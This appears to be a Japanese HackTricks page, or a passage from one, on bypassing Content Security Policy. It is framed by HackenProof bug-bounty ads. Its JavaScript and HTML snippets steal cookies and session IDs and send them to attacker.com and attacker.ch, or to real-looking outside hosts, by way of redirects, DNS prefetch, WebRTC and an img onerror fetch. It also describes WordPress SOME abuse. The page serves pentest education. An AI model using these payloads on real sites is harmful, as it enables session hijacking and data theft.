<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報奨金を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！急成長するWeb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## CSPをバイパスするための安全でない技術

### PHPレスポンスバッファの過負荷

PHPはデフォルトでレスポンスを4096バイトまでバッファリングすることで知られています。したがって、PHPが警告を表示している場合、**警告内に十分なデータを提供することで**、**CSPヘッダー**が**送信される前に**レスポンスが**送信**され、ヘッダーが無視されます。\
そのため、この技術は基本的には**警告でレスポンスバッファを埋める**ことで、CSPヘッダーが送信されないようにすることです。

アイデアは[**この解説**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)から。

### エラーページの書き換え

[**この解説**](https://blog.ssrf.kr/69)によると、CSP保護をバイパスするために、エラーページ（CSPなしである可能性があります）を読み込んでその内容を書き換えることができたようです。
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOMEは、**ページのエンドポイント**でのXSS（または非常に制限されたXSS）を悪用して、**同じオリジンの他のエンドポイントを悪用**する技術です。これは、攻撃者のページから脆弱なエンドポイントを読み込み、その後、攻撃者のページを同じオリジンの実際のエンドポイントにリフレッシュすることで行われます。これにより、**脆弱なエンドポイント**は**ペイロード**内の**`opener`**オブジェクトを使用して、**悪用するための実際のエンドポイントのDOMにアクセス**することができます。詳細については、次を参照してください：

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

さらに、**wordpress**には`/wp-json/wp/v2/users/1?_jsonp=data`という**JSONP**エンドポイントがあり、出力に送信された**データ**を**反映**します（ただし、文字、数字、ドットのみが制限されます）。

攻撃者は、このエンドポイントを悪用してWordPressに対して**SOME攻撃**を生成し、`<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`の中に埋め込むことができます。この**スクリプト**は、'self'によって**許可されているため**、**ロード**されます。さらに、WordPressがインストールされているため、攻撃者は**SOME攻撃**を**バイパスする**ための**脆弱な****コールバック**エンドポイントを悪用することができます。これにより、ユーザーにより多くの特権を与えたり、新しいプラグインをインストールしたりすることができます...\
この攻撃の実行方法の詳細については、[https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)を参照してください。

## CSP情報漏洩のバイパス

外部サーバーとの**やり取りを許可しない厳格なCSP**がある場合、情報を漏洩させるために常に行えるいくつかの方法があります。

### Location

単純に場所を更新して、秘密の情報を攻撃者のサーバーに送信することができます：
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### メタタグ

メタタグを注入することでリダイレクトすることができます（これは単なるリダイレクトであり、コンテンツは漏洩しません）。
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS プリフェッチ

ページを高速に読み込むために、ブラウザはホスト名を事前に IP アドレスに解決し、後で使用するためにキャッシュします。\
ブラウザにホスト名を事前に解決させるためには、次のように指定します：`<link reol="dns-prefetch" href="something.com">`

これを悪用して、**DNS リクエストを介して機密情報を漏洩**することができます。
```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```
別の方法:
```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```
この問題を回避するために、サーバーは次のHTTPヘッダーを送信することができます：
```
X-DNS-Prefetch-Control: off
```
{% hint style="info" %}
明らかに、このテクニックはヘッドレスブラウザ（ボット）では機能しません。
{% endhint %}

### WebRTC

いくつかのページでは、**WebRTCはCSPの`connect-src`ポリシーをチェックしない**と書かれています。

実際には、*DNSリクエスト*を使用して情報を*漏洩*させることができます。以下のコードをご覧ください：
```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```
## オンラインでCSPポリシーをチェックする

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSPを自動的に作成する

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 参考文献

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期におけるweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**してみませんか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを。
* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
